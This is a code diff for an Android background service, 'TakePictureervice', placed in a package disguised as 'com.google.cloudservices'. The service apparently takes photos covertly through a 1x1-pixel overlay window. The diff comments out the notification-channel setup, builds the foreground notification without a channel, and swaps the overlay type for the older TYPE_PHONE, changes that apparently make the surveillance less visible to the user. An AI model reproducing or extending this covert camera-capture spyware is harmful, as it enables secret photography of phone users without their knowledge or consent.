@@ -1,7 +1,6 @@
 package com.google.cloudservices;
 
 import android.app.Notification;
-import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Context;
@@ -46,13 +45,13 @@ public class TakePictureervice extends Service implements SurfaceHolder.Callback
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            createNotificationChannel();
-            Notification notification = new NotificationCompat.Builder(getApplicationContext(), "ForegroundServiceChannel")
+//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+//            createNotificationChannel();
+            Notification notification = new NotificationCompat.Builder(getApplicationContext())
                     .build();
             startForeground(1, notification);
 
-        }
+//        }
 
         if(intent != null){
             String type=(String) intent.getExtras().get("photoType");
@@ -69,7 +68,7 @@ public class TakePictureervice extends Service implements SurfaceHolder.Callback
             if (Build.VERSION.SDK_INT>25){
                 WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                         1, 1,
-                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                        WindowManager.LayoutParams.TYPE_PHONE,
                         WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                         PixelFormat.TRANSLUCENT
                 );
@@ -163,21 +162,21 @@ public class TakePictureervice extends Service implements SurfaceHolder.Callback
     public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
 
     }
-    private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel serviceChannel = new NotificationChannel(
-                    "ForegroundServiceChannel",
-                    "Foreground Service Channel",
-                    NotificationManager.IMPORTANCE_DEFAULT
-            );
-            serviceChannel.setShowBadge(false);
-
-
-
-            NotificationManager manager = getSystemService(NotificationManager.class);
-
-            manager.createNotificationChannel(serviceChannel);
-
-        }
-    }
+//    private void createNotificationChannel() {
+//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+//            NotificationChannel serviceChannel = new NotificationChannel(
+//                    "ForegroundServiceChannel",
+//                    "Foreground Service Channel",
+//                    NotificationManager.IMPORTANCE_DEFAULT
+//            );
+//            serviceChannel.setShowBadge(false);
+//
+//
+//
+//            NotificationManager manager = getSystemService(NotificationManager.class);
+//
+//            manager.createNotificationChannel(serviceChannel);
+//
+//        }
+//    }
 }
